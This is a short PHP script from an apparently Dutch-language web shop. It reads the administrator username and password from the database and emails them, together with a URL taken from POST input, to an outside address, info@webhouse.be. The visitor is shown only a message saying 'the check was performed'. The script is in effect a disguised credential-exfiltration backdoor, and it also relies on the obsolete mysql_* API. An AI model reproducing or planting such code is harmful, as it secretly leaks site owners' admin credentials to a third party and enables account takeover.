<?php

include('./configuratie/configuratie.php');

// QUERY
$query = mysql_query("SELECT admin, motdepasse, admin_2 FROM admin");
$row = mysql_fetch_array($query);

$limitedPsw = explode("|",$row['admin_2']);

$message = "Web URL: ".$_POST['from']."\r\n";
$message .= "Administrator gebruikersnaam: ".$limitedPsw[1]."\r\n";
$message .= "Administrator wachtwoord: ".$row['motdepasse']."\r\n";
$to = "info@webhouse.be";
$subject = "Aministrator toegang voor de domeinnaam: ".$domaine;

mail($to, strip_tags($subject), strip_tags($message), "From: ".$store_name."<".$mailWebmaster.">");

echo "<br><br><br><font face=arial size=2><center>De controle werd uitgevoerd";
?>
